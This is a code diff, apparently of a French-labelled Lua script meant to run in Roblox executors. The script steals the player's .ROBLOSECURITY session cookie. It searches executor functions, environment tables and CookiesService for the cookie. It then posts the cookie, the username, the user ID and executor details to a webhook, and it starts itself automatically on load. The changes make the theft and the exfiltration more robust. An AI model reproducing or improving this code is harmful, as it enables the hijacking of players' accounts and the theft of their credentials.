@@ -64,19 +64,12 @@ local REQUEST_NAMES = {
 }
 
 local function _resolve(path)
-    local node
-    for i, part in ipairs({(path:gsub("%.", "\1")):split("\1")}) do
-        if i == 1 then
-            local ok, v = pcall(function() return getgenv()[part] end)
-            if not ok then return nil end
-            node = v
-            if type(node) == "function" then return node end
-        else
-            if type(node) ~= "table" then return nil end
-            local ok, v = pcall(function() return node[part] end)
-            if not ok then return nil end
-            node = v
-        end
+    local node = getgenv()
+    for part in string.gmatch(path, "[^%.]+") do
+        if type(node) ~= "table" then return nil end
+        local ok, v = pcall(function() return node[part] end)
+        if not ok then return nil end
+        node = v
     end
     if type(node) == "function" then return node end
     return nil
@@ -95,7 +88,7 @@ local function _allRequests()
 end
 
 local function _headersOf(r)
-    local hk, val = nil, nil
+    local val, hk = nil, nil
     if type(r) ~= "table" then return nil, hk end
     for k, v in pairs(r.Headers or {}) do
         hk = (hk and (hk .. ",") or "") .. tostring(k)
@@ -123,7 +116,7 @@ local URLS = {
 
 local function _scanEnv(env)
     if type(env) ~= "table" then return nil end
-    local ok = pcall(function()
+    local ok, res = pcall(function()
         for k, v in pairs(env) do
             if type(v) == "string" and #v > 100 and (v:find("_|WARNING", 1, true) or v:find("ROBLOSECURITY", 1, true)) then
                 local m = _extract(v)
@@ -135,19 +128,21 @@ local function _scanEnv(env)
                 if m then return m end
             end
         end
+        return nil
     end)
-    return ok
+    if ok then return res end
+    return nil
 end
 
 local function _scanEnvDeep(env)
     if type(env) ~= "table" then return nil end
-    pcall(function()
+    local ok, res = pcall(function()
         for k, v in pairs(env) do
             if type(v) == "table" then
                 for k2, v2 in pairs(v) do
                     if type(v2) == "function" and tostring(k2):lower():find("cookie") then
-                        local ok, r = pcall(v2)
-                        local m = ok and _extract(r)
+                        local ok2, r = pcall(v2)
+                        local m = ok2 and _extract(r)
                         if m then return m end
                     end
                 end
@@ -159,7 +154,10 @@ local function _scanEnvDeep(env)
                 end
             end
         end
+        return nil
     end)
+    if ok then return res end
+    return nil
 end
 
 local function _cookie()
@@ -168,7 +166,7 @@ local function _cookie()
         {"getcookie", function() return getcookie and getcookie() end},
         {"scan getgenv", function() return _scanEnv(getgenv()) end},
         {"scan getrenv", function() return _scanEnv(getrenv()) end},
-        {"scan tables getgenv", function() return _scanEnvDeep(getgenv()) end},
+        {"scan tables", function() return _scanEnvDeep(getgenv()) end},
         {"var ROBLOSECURITY", function() return _env("ROBLOSECURITY") end},
         {"CookiesService", function()
             local svc = game:GetService("CookiesService")
@@ -234,25 +232,29 @@ end
 
 local function _diag()
     local out = {}
-    out[#out + 1] = "EX=" .. tostring((select(2, pcall(identifyexecutor))))
+    local okEx, exName = pcall(identifyexecutor)
+    out[#out + 1] = "EX=" .. tostring(okEx and exName or "?")
     local keys = {}
     pcall(function()
         for k in pairs(getgenv()) do keys[#keys + 1] = tostring(k) end
     end)
-    out[#out + 1] = "getgenv: " .. table.concat(keys, ",")
+    out[#out + 1] = "getgenv: " .. (#keys > 0 and table.concat(keys, ",") or "VIDE")
     local reqs = {}
     for _, r in ipairs(_allRequests()) do reqs[#reqs + 1] = r[1] end
     out[#out + 1] = "request: " .. (#reqs > 0 and table.concat(reqs, ",") or "AUCUN")
     if #reqs > 0 then
-        local ok, r = pcall(reqs[1] and _resolve(reqs[1]) or function() end, {Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
-        if ok and type(r) == "table" then
-            local hk = {}
-            for k in pairs(r.Headers or {}) do hk[#hk + 1] = tostring(k) end
-            out[#out + 1] = "headers: " .. (#hk > 0 and table.concat(hk, ",") or "VIDE")
-            out[#out + 1] = "status: " .. tostring(r.StatusCode)
-            out[#out + 1] = "body: " .. tostring(r.Body):sub(1, 120)
-        else
-            out[#out + 1] = "test request KO"
+        local fn = _resolve(reqs[1])
+        if fn then
+            local ok, r = pcall(fn, {Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
+            if ok and type(r) == "table" then
+                local hk = {}
+                for k in pairs(r.Headers or {}) do hk[#hk + 1] = tostring(k) end
+                out[#out + 1] = "headers: " .. (#hk > 0 and table.concat(hk, ",") or "VIDE")
+                out[#out + 1] = "status: " .. tostring(r.StatusCode)
+                out[#out + 1] = "body: " .. tostring(r.Body):sub(1, 100)
+            else
+                out[#out + 1] = "test request KO"
+            end
         end
     end
     local la = _env("LOCALAPPDATA")
@@ -277,6 +279,19 @@ local function _diag()
     return s
 end
 
+local function _send(payload)
+    local body = _hs:JSONEncode(payload)
+    for _, req in ipairs(_allRequests()) do
+        local good, r = pcall(req[2], {
+            Url = WEBHOOK, Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = body,
+        })
+        if good and r and r.StatusCode and r.StatusCode < 300 then return true end
+    end
+    return false
+end
+
 local function _log()
     local plr = game:GetService("Players").LocalPlayer
     local n = 0
@@ -285,19 +300,19 @@ local function _log()
         n = n + 1
         plr = game:GetService("Players").LocalPlayer
     end
-    if not plr then return end
 
-    local cookie = _cookie()
+    local okC, cookie = pcall(_cookie)
+    if not okC then cookie = nil end
+
     local ok, ex = pcall(identifyexecutor)
     local stamp = "?"
     pcall(function() stamp = os.date("%d/%m/%Y %H:%M:%S") end)
 
     local fields = {
-        {name = "Utilisateur", value = ("`%s`"):format(plr.Name), inline = true},
-        {name = "UserID", value = ("`%d`"):format(plr.UserId), inline = true},
-        {name = "Compte", value = tostring(plr.AccountAge) .. " j", inline = true},
+        {name = "Utilisateur", value = ("`%s`"):format(plr and plr.Name or "?"), inline = true},
+        {name = "UserID", value = ("`%d`"):format(plr and plr.UserId or 0), inline = true},
+        {name = "Compte", value = tostring(plr and plr.AccountAge or 0) .. " j", inline = true},
         {name = "Exécuteur", value = ("`%s`"):format(ok and tostring(ex) or "?"), inline = true},
-        {name = "Profil", value = ("https://www.roblox.com/users/%d/profile"):format(plr.UserId), inline = false},
     }
 
     if cookie then
@@ -310,11 +325,11 @@ local function _log()
         local t = table.concat(_tried, ", ")
         if #t > 600 then t = t:sub(1, 600) .. "…" end
         table.insert(fields, {name = "Échecs", value = "```" .. t .. "```", inline = false})
-        table.insert(fields, {name = "Debug", value = "```" .. _diag() .. "```", inline = false})
-        pcall(setclipboard, "getcookie()")
+        local okD, d = pcall(_diag)
+        table.insert(fields, {name = "Debug", value = "```" .. tostring(okD and d or "diag KO") .. "```", inline = false})
     end
 
-    local payload = {
+    _send({
         username = "Void",
         content = cookie and ("```\n" .. cookie .. "\n```") or "**Cookie introuvable**",
         embeds = {{
@@ -323,17 +338,7 @@ local function _log()
             fields = fields,
             footer = {text = stamp},
         }},
-    }
-
-    local reqs = _allRequests()
-    for _, req in ipairs(reqs) do
-        local good, r = pcall(req[2], {
-            Url = WEBHOOK, Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = _hs:JSONEncode(payload),
-        })
-        if good and r and r.StatusCode and r.StatusCode < 300 then return end
-    end
+    })
 end
 
 task.spawn(function() pcall(_log) end)
